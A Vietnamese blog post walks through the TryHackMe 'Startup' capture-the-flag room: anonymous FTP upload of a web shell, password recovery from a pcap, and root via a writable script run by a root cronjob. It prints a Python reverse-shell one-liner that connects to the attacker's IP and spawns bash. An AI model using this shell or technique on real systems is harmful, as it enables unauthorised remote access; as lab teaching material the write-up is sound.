---
layout: post
author: "Neo"
title: "Tryhackme - Startup"
date: "2021-10-15"
tags: [
    "tryhackme",
    "web",
    "linux",
    "ftp",
    "ssh",
    "cron",
    "wireshark"
]
categories: ctf
---

0. this unordered seed list will be replaced by toc as unordered list
{:toc}

![intro](/assets/img/THM-Startup/intro.png?stayle=centerme)

Xin chào, Lẩu đây. Hôm nay tôi sẽ giải CTF [Tryhackme - Startup](https://tryhackme.com/room/startup). Géc gô!!!

Vẫn như thông thường thôi, việc đầu tiên cần làm là quét cổng. 

![scan-port](/assets/img/THM-Startup/scan-port.png?stayle=centerme)

Chúng ta có 3 port đang mở:
-   port 21 với ftp server và cho phép login bằng anonymous.
-   port 22 chạy ssh trên ubuntu server
-   port 80 với Apache httpd 2.4.18 trên ubuntu server

Với port 21, tôi có vài thứ hay ho ở đây.

![port21](/assets/img/THM-Startup/port21.png?stayle=centerme)

Trong ftp server tôi có 1 file txt và 1 file ảnh, user anonymous cũng có quyền sửa, ghi file. Vậy là tôi có thể upload file lên ftp server, tôi không chắc. Xem qua 2 file kia đã.

![notice](/assets/img/THM-Startup/notice.png?stayle=centerme)

Tôi có 1 cái tên ở đây: __Maya__. Còn chiếc ảnh kia thì không có gì đặc biệt lắm. Tôi sẽ quay lại ftp server để put shell lên xem có được không. 

![put-shell](/assets/img/THM-Startup/put-shell.png?stayle=centerme)

Được rồi. Bây giờ thử check web path để xem có tìm được url của file vừa up không.

![dirsearch](/assets/img/THM-Startup/dirsearch.png?stayle=centerme)

Vào path /files và tôi tìm thấy ftp file server. 

![shell](/assets/img/THM-Startup/shell.png?stayle=centerme)

Tạo listener với port đã cấu hình bên trong shell và thử mở file.

![get-shell](/assets/img/THM-Startup/get-shell.png?stayle=centerme)

Ồ được rồi này. Config lại shell 1 chút với python để dễ khai thác hơn. Trong file server web chúng ta có 1 file recipe.txt. Mở file này và tôi tìm được *secret spicy soup recipe*.

Vào thư mục /home và tôi có user *lennie*. Tuy nhiên không cần có password. Tôi thử check xem có thư mục nào chạy quyền của www-data không. Và tôi tìm thấy thư mục __incidents__.

![incidents](/assets/img/THM-Startup/incidents.png?stayle=centerme)

Trong này có 1 file pcap, clone nó về và thử check bằng Wireshark xem có tìm được gì đặc biệt không, biết đâu lại có password của Lennie. Tôi tạo http server bằng python trên máy remote và wget file pcap về máy local của mình, đáp nó vào Wireshark thôi.

Sau 1 thời gian dài ngụp lặn, tôi đã tìm được password của user lennie, trong file pcap. 

![lennie-password](/assets/img/THM-Startup/lennie-pass.png?stayle=centerme)

Đăng nhập và tôi có user flag.

![user-flag](/assets/img/THM-Startup/user-flag.png?stayle=centerme)

Việc tiếp theo là leo thang đặc quyền. Cùng với user flag tôi có thêm 2 folder nữa và folder __scripts__ có chứa file thực thi. Tôi sẽ khai thác nó trước. File __planner.sh__ sẽ ghi đề 1 list vào file __startup_list.txt__ và sau đó thực thi file __/etc/print.sh__. Tôi check qua file __print.sh__ thì nó đang chạy dưới quyền user lennie, điều này có nghĩa là chúng ta có thể sửa được file này.

Tôi sẽ thêm reverse shell vào file này, nhưng không thể get root được. Do file planner.sh này có thể chạy được nên tôi sẽ thử kiểm tra xem nó có phải 1 cronjob chạy dưới quyền root hay không. Và đúng là như vậy.

Nên việc tiếp theo là sửa file này để gọi reverse shell. Tôi sẽ dùng shell này

```python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.**.**",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'```

À trước tiên phải tạo listener đã. 

![reverse-shell](/assets/img/THM-Startup/reverse-shell.png?stayle=centerme)

![rooted](/assets/img/THM-Startup/rooted.png?stayle=centerme)

Vậy là xong. Rooted!






